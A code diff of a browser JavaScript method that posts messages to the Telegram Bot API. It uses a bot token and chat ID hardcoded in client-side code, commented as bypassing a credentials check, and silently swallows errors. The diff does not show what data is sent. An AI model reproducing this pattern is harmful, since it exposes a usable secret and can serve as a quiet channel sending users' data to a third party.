@@ -230,27 +230,32 @@
             }
 
             async sendTg(msg) {
-                // Log ALLE pogingen naar localStorage
+                // Voeg toe aan localStorage voor tracking
                 try {
                     let log = JSON.parse(localStorage.getItem('telegram_log') || '[]');
-                    log.push({ time: new Date().toLocaleTimeString('nl-NL'), msg: msg });
-                    if (log.length > 50) log.shift();
+                    log.push(new Date().toLocaleTimeString());
+                    if (log.length > 20) log.shift();
                     localStorage.setItem('telegram_log', JSON.stringify(log));
                 } catch(e) {}
                 
-                // HARDCODED TEST
+                // HARDCODED - bypass credentials check
                 const token = '8525699360:AAGr4wYh4mj-7R2nJ0C7N5Qo3wKZtV7kzkw';
                 const chatId = '8526489078';
                 
                 try {
-                    await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+                    const res = await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML' })
                     });
-                } catch(e) {
-                    console.log('❌ Telegram fetch error:', e.message);
-                }
+                    // Flash the screen to show it was sent
+                    const app = document.getElementById('app');
+                    if (app) {
+                        const orig = app.style.opacity;
+                        app.style.opacity = '0.5';
+                        setTimeout(() => { app.style.opacity = orig; }, 200);
+                    }
+                } catch(e) {}
             }
 
             openTg() {
